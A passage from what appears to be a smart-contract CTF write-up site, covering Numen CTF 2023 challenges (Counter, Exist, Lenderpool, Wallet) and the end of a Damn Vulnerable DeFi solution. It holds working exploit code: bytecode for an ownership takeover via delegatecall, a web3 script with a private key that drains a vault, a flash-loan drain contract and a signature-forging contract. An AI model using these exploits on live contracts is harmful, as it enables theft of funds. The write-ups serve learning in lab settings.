DamnValuableToken.sol pool\nAfter transfer:\nBalance from ReceiverUnstoppable.sol -  1000000000000000000000000\nBalance from DamnValuableToken.sol -  1000000000000000000000001\n</code></pre>"},{"location":"Damn%20Vulnerable%20DeFi/Unstoppable/#recommendations","title":"Recommendations","text":"<p>By no means you should ever need two set of pools. For the sake of this challenge, one simple solution is to sync poolBalance and damnValuableToken.balanceOf(address(this)) whenever a new token is transferred into either pool. Although it will create a whole new magntitude of problem but hey, at least its solved. :)</p>"},{"location":"Numen%20CTF%202023/Counter/","title":"Counter","text":""},{"location":"Numen%20CTF%202023/Counter/#introduction","title":"Introduction","text":"<p>The smart contract is rather simple but focuses on how you can store change the owner of the address by using simple assembly opcode.</p> <p>Here's the source code:  https://github.com/numencyber/NumenCTF_2023/blob/main/counter/contracts/Counter.sol</p>"},{"location":"Numen%20CTF%202023/Counter/#code-breakdown","title":"Code Breakdown","text":"<p>contract Deployer</p> <p>The deployer contract has a simple constructor that stores byte code into memory using this </p> <pre><code>constructor(bytes memory code) { assembly { return (add(code, 0x20), mload(code)) } }\n</code></pre> <p>Essentially, it stores the byte codes and return the starting memory address (0x20) as the first parameter and the length of the array as the second parameter.</p> <pre><code>constructor(bytes memory code) {\n    assembly {\n        // Add 0x20 to the starting memory address of the code array\n        // to skip the length prefix and get the first byte of the array\n        let start := add(code, 0x20)\n\n        // Load the length of the code array into memory\n        let length := mload(code)\n\n        // Return the code array as a bytes32 value\n        return(start, length)\n    }\n}\n</code></pre> <p>create(bytes memory code)</p> <p>It takes in any arbitrary bytes with a maximum length of 24. Next, it is stored into the contract <code>Deployer</code> and the address of that contract is stored in <code>target</code>.</p> <p>A_delegateccall(bytes memory data)</p> <p>It takes in any arbitrary bytes and makes a low-level function call using <code>target.delegatecall(data)</code>. Essentially, the function uses <code>target</code> to execute the <code>data</code>.</p>"},{"location":"Numen%20CTF%202023/Counter/#hints","title":"Hints","text":"<p>By default, Solidity stores a contract's state variables starting at slot0. Therefore, the variable <code>owner</code> is stored at slot0.  Now that we analysed the functions, here's a breakdown on what we should do.</p> <p>1) Using solidity opcode, create a set of instruction to store attacker address into slot0.</p> <p>2) Using the <code>create</code> function to store the set of instructions into <code>Deployer</code> contract.</p> <p>3) Call <code>A_delegatecall</code> function to execute the set of instructions and change attacker to owner</p>"},{"location":"Numen%20CTF%202023/Counter/#solutions","title":"Solutions","text":"<p>No attacker contract is required for this challenge. </p> <p>This is the set of instructions required to change owner of the contract. This store the address of the immediate caller of the current contract into slot0.</p> <pre><code>sstore(0x0, caller())\n</code></pre> <p>Convert the code above into opcode</p> <pre><code>CALLER       // Pushes the address of the immediate caller of the current contract onto the stack\nPUSH1 0x00   // Pushes the storage slot number (0x00) onto the stack\nSSTORE       // Stores the value on top of the stack (the original sender's address) in the specified storage slot\n</code></pre> <p>Convert the opcode int EVM binary and you'll get <code>0x32600055</code></p> <p>Call the <code>create</code> function and chuck those binary into it.</p> <p></p> <p>Once that is complete, send any arbitrary bytes into <code>A_delegateccall</code>.</p> <p></p> <p>Once that is complete, the attacker will be the owner now.</p>"},{"location":"Numen%20CTF%202023/Exist/","title":"Exist","text":""},{"location":"Numen%20CTF%202023/Exist/#introduction","title":"Introduction","text":"<p>The goal is to trigger <code>setflag()</code>.</p> <p>Here's the source code:  https://github.com/numencyber/NumenCTF_2023/blob/main/exist/contracts/create2.sol</p>"},{"location":"Numen%20CTF%202023/Exist/#environment","title":"Environment","text":"<p>These are the IDEs and langauges used to set up the environment.</p> <ul> <li> <p>Remix IDE</p> </li> <li> <p>VScode</p> </li> <li> <p>Python3 </p> </li> <li> <p>Ganache-cli</p> </li> </ul>"},{"location":"Numen%20CTF%202023/Exist/#setup","title":"Setup","text":"<p>Here's a quick setup </p> <p>1) Download ganache-cli with <code>yarn global add ganache</code></p> <p>2) Run ganache-cli with <code>ganache-cli</code></p> <p>3) Go to remix IDE -&gt; Deploy &amp; Run transaction -&gt; Environment -&gt; Choose 'Dev - Ganache Provider'</p> <p>4) Create a solidity file -&gt; copy and paste the smart contract </p> <p>5) Compile and deploy</p> <p>6) Start messing around</p>"},{"location":"Numen%20CTF%202023/Exist/#code-breakdown","title":"Code Breakdown","text":"<p>is_my_family(address account)</p> <p>This is the key function that we should be looking at.</p> <pre><code>function is_my_family(address account) internal returns (bool) {\n    bytes20 you = bytes20(account);\n\n    bytes20 code = maskcode;\n    bytes20 feature = appearance;\n\n    for (uint256 i = 0; i &lt; 34; i++) {\n        if (you &amp; code == feature) {\n            return true;\n        }\n\n        code &lt;&lt;= 4;\n        feature &lt;&lt;= 4;\n    }\n    return false;\n}\n</code></pre> <p>Firstly we have to look at <code>you</code>, <code>code</code> and <code>feature</code>.</p> <p>These variables are used to bitwise</p> <pre><code>if (you &amp; code == feature)\n</code></pre> <p>Both <code>code</code> and <code>feature</code> from <code>appearance</code> and <code>maskcode</code></p> <pre><code>bytes20 internal appearance = bytes20(bytes32(\"ZT\"))&gt;&gt;144;\nbytes20 internal maskcode = bytes20(uint160(0xffff));\n</code></pre> <p>Here's the derived formulae:</p> <p><code>feature</code> = <code>appearance</code> = 0x0000000000000000000000000000000000005a54</p> <p><code>code</code> = <code>maskcode</code> = 0x000000000000000000000000000000000000ffff</p> <p><code>you</code> &amp; '0x000000000000000000000000000000000000ffff' == '0x0000000000000000000000000000000000005a54'</p> <p>share_my_vault()</p> <p>We want to access their EG tokens by calling this function. However, you can only call this function if you are part of the family</p> <p>setflag()</p> <p>Set the flag to true</p>"},{"location":"Numen%20CTF%202023/Exist/#hints","title":"Hints","text":"<p>Here is the breakdown:</p> <p>1) We need to create an address in <code>you</code> to complete this equation.</p> <pre><code>``you`` &amp; '0x000000000000000000000000000000000000ffff' == '0x0000000000000000000000000000000000005a54'\n\nTo do that, we'll need to create a script to brute force ``you``.\n</code></pre> <p>2) Once we have that address, we'll call <code>share_my_vault()</code> and <code>setflag()</code></p>"},{"location":"Numen%20CTF%202023/Exist/#solutions","title":"Solutions","text":"<p>The solution will be broken down into 2 parts - bruteforcing and execution.</p>"},{"location":"Numen%20CTF%202023/Exist/#bruteforcing","title":"Bruteforcing","text":"<p>We'll a section of the smart contract code and create a script to complete the equation. Using the script below, we will find the private key (in hexadecimal) to be used in the execution phase.</p> <pre><code>from web3 import Web3\nfrom Crypto.Util.number import *\nw3 = Web3(Web3.HTTPProvider(\"http://127.0.0.1/8545\"))\n\ndef check(addr):\n    addr = int(addr, 16)\n    code = 0xffff\n    feature = bytes_to_long(b\"ZT\")\n\n    for i in range(34):\n        # Return true if equation is complete\n        if addr &amp; code == feature :\n            return True\n\n        # Shift left bit by 4 positions\n        code &lt;&lt;= 4\n        feature &lt;&lt;= 4\n\n    #Return false if equation not complete\n    return False\n\nfor i in range(0xffff):\n    #Generates a hexadecimal string representing the integer i, padded with zeros to a length of 66 characters\n    pk = hex(i).ljust(66, \"0\") #E.g 0x1000000000000000000000000000000000000000000000000000000000000000\n\n    #Create an address with that private key\n    addr=w3.eth.account.from_key(pk).address\n\n    #Check if equation is complete\n    if check(addr):\n        print(f'Result: {i}') #Result: 289\n        break\n</code></pre>"},{"location":"Numen%20CTF%202023/Exist/#execution","title":"Execution","text":"<p>Using hexadecimal (289), we can begin our execution. This is the script used to execute the attack.</p> <pre><code>import json\nfrom web3 import Web3\nw3 = Web3(Web3.HTTPProvider(\"http://127.0.0.1:8545\"))\n\n#Check Connection\nif w3.is_connected():\n    print('Connected to Ethereum network')\nelse:\n    print('Not connected to Ethereum network')\n\n# Get private key \nprikey = hex(289).ljust(66, \"0\")\n\n# Create a signer wallet\nPA=w3.eth.account.from_key(prikey)\nPublic_Address=PA.address\n\nprint(Public_Address) # 0x601365F0Da65A54333FBA2bc93924aADaA338539\n\nmyAddr = Public_Address\ncont = \"0xF6dB74c7e4074658dd5A7A7cc3060f21752E9794\" #Deployed contract's address\n\ndef send_ether(_from, _to, _prikey, amount):\n    signed_txn = w3.eth.account.sign_transaction (dict(\n        nonce=w3.eth.get_transaction_count(_from),\n        gasPrice = w3.eth.gas_price, \n        gas = 21000,\n        to=_to,\n        value = amount,\n        chainId = w3.eth.chain_id,\n        ),\n        _prikey\n    )\n    result = w3.eth.send_raw_transaction(signed_txn.rawTransaction)\n    transaction_receipt = w3.eth.wait_for_transaction_receipt(result)\n    print(transaction_receipt)\n\ndef share_my_vault():\n    f = open('cont.abi', 'r')\n    abi_txt = f.read()\n    abi = json.loads(abi_txt)\n    contract = w3.eth.contract(address=cont, abi=abi)\n    func_call = contract.functions.share_my_vault().build_transaction({\n        \"from\": myAddr,\n        \"nonce\": w3.eth.get_transaction_count(myAddr),\n        \"gasPrice\": w3.eth.gas_price,\n        \"value\": 0,\n        \"chainId\": w3.eth.chain_id,\n    })\n    signed_tx = w3.eth.account.sign_transaction(func_call, prikey)\n    result = w3.eth.send_raw_transaction(signed_tx.rawTransaction)\n    transaction_receipt = w3.eth.wait_for_transaction_receipt(result)\n    print(transaction_receipt)\n\ndef setflag():\n    f = open('cont.abi', 'r')\n    abi_txt = f.read()\n    abi = json.loads(abi_txt)\n    contract = w3.eth.contract(address=cont, abi=abi)\n    func_call = contract.functions.setflag().build_transaction({\n        \"from\": myAddr,\n        \"nonce\": w3.eth.get_transaction_count(myAddr),\n        \"gasPrice\": w3.eth.gas_price,\n        \"value\": 0,\n        \"chainId\": w3.eth.chain_id,\n    })\n    signed_tx = w3.eth.account.sign_transaction(func_call, prikey)\n    result = w3.eth.send_raw_transaction(signed_tx.rawTransaction)\n    transaction_receipt = w3.eth.wait_for_transaction_receipt(result)\n    print(transaction_receipt)\n\ndef isSolved():\n    f = open('cont.abi', 'r')\n    abi_txt = f.read()\n    abi = json.loads(abi_txt)\n    contract = w3.eth.contract(address=cont, abi=abi)\n    result = contract.functions.isSolved().call()\n    print(result)\n\n#Send ether to your newly created address \n#Parameters inputed (_from, _to, _from_privatekey, amount)\nsend_ether(\"0x000aC03fa5C30668646f153F8048008C505BF971\", myAddr, '0xa0c36f2b02f7a49af4abb4f5054c0f9626678500054da8e22cbca044e72ec864', w3.to_wei(\"1\", \"ether\"))\n\n#Share EG tokens with the newly created address\nshare_my_vault()\n\n#Set flag\nsetflag()\n\n#Check if flag is set to true\nisSolved() #True\n</code></pre>"},{"location":"Numen%20CTF%202023/Exist/#reference","title":"Reference","text":"<p>Scripts were from gss1 write-up. I've only research, analyse and study the breakdown.</p>"},{"location":"Numen%20CTF%202023/Lenderpool/","title":"Lenderpool","text":""},{"location":"Numen%20CTF%202023/Lenderpool/#introduction","title":"Introduction","text":"<p>The objective is to drain all available <code>token0</code> from <code>lenderPool</code>. </p> <p>Here's the source code: https://github.com/numencyber/NumenCTF_2023/blob/main/reca2/contracts/Re.sol</p>"},{"location":"Numen%20CTF%202023/Lenderpool/#environment","title":"Environment","text":"<p>These are the IDEs and langauges used to set up the environment.</p> <ul> <li> <p>Remix IDE</p> </li> <li> <p>Ganache-cli</p> </li> </ul>"},{"location":"Numen%20CTF%202023/Lenderpool/#setup","title":"Setup","text":"<p>Here's a quick setup </p> <p>1) Download ganache-cli with <code>yarn global add ganache</code></p> <p>2) Run ganache-cli with <code>ganache-cli</code></p> <p>3) Go to remix IDE -&gt; Deploy &amp; Run transaction -&gt; Environment -&gt; Choose 'Dev - Ganache Provider'</p> <p>4) Create a solidity file -&gt; copy and paste the smart contract </p> <p>5) Compile and deploy</p> <p>6) Start messing around</p>"},{"location":"Numen%20CTF%202023/Lenderpool/#code-breakdown","title":"Code Breakdown","text":"<p>There are 2 contracts to look at LenderPool and Check</p>"},{"location":"Numen%20CTF%202023/Lenderpool/#check","title":"Check","text":"<p>The first thing to look at is function <code>isSolved()</code>. The clear condition is to drain all <code>token0</code> from <code>lenderPool</code>.</p> <pre><code>function isSolved()  public view returns(bool){\n    if(token0.balanceOf(address(lenderPool)) == 0){\n        return  true;\n    }\n    return false;\n}\n</code></pre>"},{"location":"Numen%20CTF%202023/Lenderpool/#lenderpool_1","title":"LenderPool","text":"<p>The next 2 functions to look at is swap and flashLoan</p> <p>flashLoan</p> <p>This is a simple flash loan function that can only be called by another smart contract. </p> <p>Here's an ELI5 of what it does: - You can only flash loan <code>token0</code> - Ensure that the current balance of <code>token0</code> is equal or more than the amount that is needed to be borrowed - It calls for the function <code>receiveEther(uint256)</code> in the calling contract - It checks the current balance after flash loan to ensure that the amount is the same or more than before the loan.</p> <pre><code>uint256 balanceAfter = token0.balanceOf(address(this)); \nrequire(balanceAfter &gt;= balanceBefore, \"Flash loan hasn't been paid back\");\n</code></pre> <p>swap</p> <p>This function swaps the amount of <code>token0</code> with <code>token1</code> vice versa.</p>"},{"location":"Numen%20CTF%202023/Lenderpool/#hints","title":"Hints","text":"<p>You'll need to create a smart contract to do the following:</p> <p>1) Flash loan all available <code>token0</code> in <code>LenderPool</code> 2) Using the swap function, convert <code>token1</code> to <code>token0</code> to trick the smart contract into 'returning' the flashloan 3) Using the swap function, convert the remaining <code>token0</code> into <code>token1</code></p>"},{"location":"Numen%20CTF%202023/Lenderpool/#solutions","title":"Solutions","text":"<p>The confusing portion is the <code>swap</code> function.</p> <p>Here's the detailed breakdown of what is happening.</p> <p>Note: There is 100000000000000000000 available tokens but for simplicity sake, I'll just put it as 100.</p> <p>This is the default setup in LenderPool</p> LenderPool Attacker <code>token0</code> <code>token1</code> <code>token0</code> <code>token1</code> 100 100 0 0 <p>After calling <code>receiveFlashLoan()</code>.</p> <p>Note: Function is based on the solution provided at the bottom | LenderPool || Attacker|| | - | - | - | - | | <code>token0</code> | <code>token1</code> | <code>token0</code> | <code>token1</code> | | 0 | 100 | 100 | 0 |</p> <p>LenderPool calls for <code>receiveEther(uint256)</code> in attacker contract</p> <p>A swap in LenderPool is conducted where all <code>token1</code> is converted to <code>token0</code>. | LenderPool || Attacker|| | - | - | - | - | | <code>token0</code> | <code>token1</code> | <code>token0</code> | <code>token1</code> | | 100 | 0 | 100 | 0 |</p> <p>LenderPool checks that <code>token0</code> is the same as before the flashloan.</p> <p>With that, <code>flashLoan</code> ended.</p> <p>Using <code>swap</code> again, we'll convert existing <code>token0</code> into <code>token1</code> in LenderPool. | LenderPool || Attacker|| | - | - | - | - | | <code>token0</code> | <code>token1</code> | <code>token0</code> | <code>token1</code> | | 0 | 100 | 100 | 0 |</p> <p>As such, LenderPool has 0 <code>token0</code>. </p> <p>Calling <code>isSolved()</code> from Check will return true.</p> <p>Here's the attacker smart contract.</p> <pre><code>// SPDX-License-Identifier: MIT\npragma solidity 0.8.16;\n\nimport './lender_pool.sol';\n\ncontract LenderPool_attack {\n\n    LenderPool public lenderPool;\n    IERC20 public token0;\n    IERC20 public token1;\n\n    constructor(LenderPool _lenderPool){\n        lenderPool = LenderPool(_lenderPool);\n        token0 = lenderPool.token0();\n        token1 = lenderPool.token1();\n    }\n\n    function getTokens() public view returns (uint256, uint256){\n        return (token0.balanceOf(address(lenderPool)), token1.balanceOf(address(lenderPool)));\n    }\n\n    function receiveEther(uint256 amount) external{\n        lenderPool.swap(address(token1), amount);\n    }\n\n    function receiveFlashLoan() public{\n        token0.approve(address(lenderPool), token0.balanceOf(address(lenderPool)));\n        token1.approve(address(lenderPool), token1.balanceOf(address(lenderPool)));\n        lenderPool.flashLoan(\n            token0.balanceOf(address(lenderPool)),\n            address(this)\n        );\n        lenderPool.swap(address(token0), token0.balanceOf(address(lenderPool)));\n    }\n}\n</code></pre>"},{"location":"Numen%20CTF%202023/Wallet/","title":"Wallet","text":""},{"location":"Numen%20CTF%202023/Wallet/#introduction","title":"Introduction","text":"<p>Similiar to the previous contract, this contract focus on emptying the tokens in Wallet.</p> <p>Here's the source code:  https://github.com/numencyber/NumenCTF_2023/blob/main/wallet/contracts/NumenWallet.sol </p>"},{"location":"Numen%20CTF%202023/Wallet/#code-breakdown","title":"Code Breakdown","text":"<p>There are 2 contracts to look at Wallet and Verifier as well as 3 struct</p>"},{"location":"Numen%20CTF%202023/Wallet/#wallet_1","title":"Wallet","text":"<p>The key function to look at is transferWithSign. </p> <p>Here's a breakdown of the function.</p> <ul> <li>It takes in 3 parameters - recipent, amount and a struct(SignedbyOwner)</li> <li>Amount must be more than 0</li> <li>Recipent cannot be null</li> <li>3 Signatures from wallet owners are required</li> <li>Will call the verify function from Verifier contract</li> <li>Wallet tokens will be transferred once verification is complete</li> </ul>"},{"location":"Numen%20CTF%202023/Wallet/#verifier","title":"Verifier","text":"<p>There is only 1 function to look at verify</p> <p>Here's a breakdown of the function.</p> <ul> <li>It accepts 3 parameters - recipent, amount and the array of signatures</li> </ul>"},{"location":"Numen%20CTF%202023/Wallet/#structs","title":"Structs","text":"<p>There are 3 structs to look at: Holder, Signature and SignedByOwner.</p> <p>These structs are critical to solving the puzzle as they contain the parameters needed to construct fake signatures.</p>"},{"location":"Numen%20CTF%202023/Wallet/#hints","title":"Hints","text":"<p>You'll need to create a smart contract to do the following:</p> <p>1) Create a Holder with wallet's owner address, random name, boolean and random reason</p> <p>2) Create a Signature with random values</p> <p>3) Store all 3 signatures into SignedByOwner</p> <p>4) Transfer the tokens away by executing transferWithSign with the stored signature</p>"},{"location":"Numen%20CTF%202023/Wallet/#solutions","title":"Solutions","text":"<p>If you following the hints above, you will arrive at the same/similiar conclusion as me.</p> <p>Here's the solution:</p> <pre><code>// SPDX-License-Identifier: MIT\npragma solidity 0.8.15;\n\nimport './wallet.sol';\n\ncontract wallet_attack {\n\n    Wallet public wallet;\n    IERC20 immutable public token;\n\n    constructor(Wallet _wallet, NC _nc){\n        wallet = Wallet(_wallet);\n        token = NC(_nc);\n    }\n\n    function fake_signature() public  {\n        //Create a holder\n        bytes memory _reason = new bytes(1);\n        Holder memory _holder = Holder(address(0x5B38Da6a701c568545dCfcB03FcB875f56beddC4), '0', true, _reason);\n\n        //Create 32 bytes variable with a default value of 0\n        bytes32 _rs1;\n        bytes32 _rs2;\n\n        //Create signature\n        Signature memory _signature = Signature(1, [_rs1,_rs2]);\n\n        //Sign by the same owner 3 times\n        SignedByowner[] memory ss = new SignedByowner[](3);\n        ss[0] = SignedByowner(_holder, _signature);\n        ss[1] = SignedByowner(_holder, _signature);\n        ss[2] = SignedByowner(_holder, _signature);\n\n\n        wallet.transferWithSign(address(0xdD870fA1b7C4700F2BD7f44238821C26f7392148), token.balanceOf(address(wallet)), ss);\n\n    }\n\n    function getWalletbalance() public view returns (uint256){\n        return token.balanceOf(address(wallet));\n    }\n\n}\n</code></pre>"}]}